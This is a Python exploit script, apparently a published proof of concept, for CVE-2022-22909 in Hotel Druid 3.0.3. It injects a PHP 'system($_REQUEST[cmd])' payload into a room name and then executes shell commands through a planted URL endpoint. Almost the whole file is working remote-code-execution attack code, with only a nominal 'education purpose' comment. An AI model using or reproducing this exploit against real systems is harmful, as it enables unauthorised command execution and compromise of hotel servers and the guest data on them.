#!/usr/bin/python

import requests
import re
import argparse

# Title : Hotel Druid 3.0.3 - Remote Code Execution (RCE)
# Author : kaal
# Github : https://github.com/kaal18
# HackTheBox : https://app.hackthebox.com/profile/248660
# Vendor Homepage: https://www.hoteldruid.com/
# Software Link: https://www.hoteldruid.com/download/hoteldruid_3.0.3.tar.gz
# Version: 3.0.3
# CVE : CVE-2022-22909

db = None
#URL = "http://127.0.0.1/hoteldruid"
URL = None
ROOM_NAME = None

def getDb():
	url = URL + "/inizio.php"
	r = requests.get(url)
	db = str(r.content).split('<a class=\"nav\" id=\"nb_men\" href=\"./inizio.php?')[1].split('=')[1].split('"')[0]
	db = str(db)
	return db

def already_exploited():
	url = URL + "/visualizza_tabelle.php"
	params = {'anno':db,'tipo_tabella':'appartamenti'}
	r = requests.get(url,params=params)
	payload = "{${system($_REQUEST[cmd])}}"

	# Regex match , Education purpose only
	pa = "\{\$\{system\(\$\_REQUEST\[cmd\]\)\}\}"
	reg = re.search(pa,r.text)
	#print(reg)

	if payload in r.text:
		print("Already Exploitd , Please visit below URL.")
		print(URL+"/dati/selectappartamenti.php?cmd=whoami")
		exit()
	else :
		print("Exploiting ")
		pass	



def modifyroom():
	db = getDb()
	url = URL + "/modifica_app.php"
	payload = '{${system($_REQUEST[cmd])}}'
	data = {'anno':db,'idappartamenti0':ROOM_NAME,'num_app_modifica':1,'n_nome_app0':payload,'modificaappartamento':1}
	r =requests.post(url,data=data)

	# continue request 
	data = {'anno':db,'num_app_modifica':1,'idappartamenti0':ROOM_NAME,'n_nome_app0':payload,'modificaappartamento':'Continua'}
	r = requests.post(url,data=data)
	
	
	if r.ok:
		print(f"Payload has been added to Room {ROOM_NAME}.")
	else :
		print("Sorry payload can't be added .")
		exit()

def exploit():
	shell = 'whoami'
	url = URL + "/dati/selectappartamenti.php"

	params = {'cmd':shell}
	
	r = requests.get(url,params=params)
	print("status Code : ",r.status_code)
	print(r.text)
	print("Exploitation url : " ,r.url)
	

# Parsing Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u','--url',type=str,dest='URL',help="Provide URL Ex. http://127.0.0.1/hoteldruid ")
parser.add_argument('-r','--room',type=str,dest='ROOM_NAME',help="Provide Room name Ex. 'abc'")
args = parser.parse_args()
print("You entered : ",args.URL)
URL = args.URL
ROOM_NAME = args.ROOM_NAME


def main():

	already_exploited()

	modifyroom()
	exploit()
main()



